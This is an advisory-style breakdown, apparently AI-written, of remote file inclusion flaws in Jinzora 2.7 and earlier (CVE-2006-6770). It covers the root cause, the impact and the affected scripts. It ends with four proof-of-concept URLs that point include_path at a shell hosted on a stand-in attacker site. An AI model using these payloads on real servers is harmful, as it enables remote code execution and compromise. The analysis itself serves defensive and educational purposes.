Based on the provided content, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2006-6770

**Vulnerability Description:** Multiple Remote File Inclusion vulnerabilities in Jinzora <= 2.7

**Root Cause:**

*   The application fails to properly sanitize user-supplied input before using it in file inclusion operations. Specifically, the `include_path` variable is not initialized or validated before being used in include statements. This allows an attacker to control the path of the included file.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The core vulnerability is that several scripts in Jinzora allow the inclusion of remote files by manipulating the `include_path` variable through a GET request. This is because the application uses the `include()` or `include_once()` functions with variables directly from the request without validation.
*   **Uninitialized Variable:** The `include_path` variable is used in file inclusion functions without being properly initialized, leading to the ability to override it through a crafted URL.
*  **Lack of Input Sanitization:** The application does not sanitize or validate the `include_path` variable before using it in include statements.

**Impact of Exploitation:**

*   **Remote Code Execution (RCE):** By including a malicious PHP file from a remote server, an attacker can execute arbitrary code on the vulnerable server. This can lead to complete compromise of the system, data theft, or other malicious activities.

**Attack Vectors:**

*   **HTTP GET Request:** The vulnerability is triggered by sending specially crafted HTTP GET requests to several vulnerable scripts (`popup.php`, `rss.php`, `ajax_request.php`, and `mediabroadcast.php`).

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs to be able to send HTTP requests to the vulnerable Jinzora server.
*   **Malicious Server:** The attacker needs to have a server hosting the malicious PHP file they want to include.
*   **Knowledge of Vulnerable Parameter:** The attacker needs to be aware of the `include_path` variable and the vulnerable scripts to exploit.

**Detailed Information:**

The exploit-db.com content provides very specific technical details on the vulnerable code, line numbers, and proof of concept exploit URLs.  Here's a breakdown:

*   **Vulnerable Files:**
    *   `popup.php`:  Includes `jzBackend.php` before the `include_path` variable is potentially set.
    *   `jzBackend.php`: Uses the uninitialized `$include_path` variable to include `settings.php` and includes `$css`.
    *   `rss.php`: Includes `backend/backend.php`.
    *  `backend/backend.php`:  Uses the uninitialized `$include_path` variable to include `system.php`.
    *   `ajax_request.php`: Includes `jzBackend.php`, thus inheriting the vulnerability.
    *   `mediabroadcast.php`: Includes `backend/backend.php`, thus inheriting the vulnerability.
*   **Proof of Concept URLs:**
    *   `http://[target]/[path]/popup.php?include_path=http://evilsite.com/shell.php?`
    *   `http://[target]/[path]/rss.php?include_path=http://evilsite.com/shell.php?`
    *   `http://[target]/[path]/ajax_request.php?include_path=http://evilsite.com/shell.php?`
    *   `http://[target]/[path]/mediabroadcast.php?include_path=http://evilsite.com/shell.php?`
    * These URLs demonstrate how to inject a malicious file from `evilsite.com` via the include path.
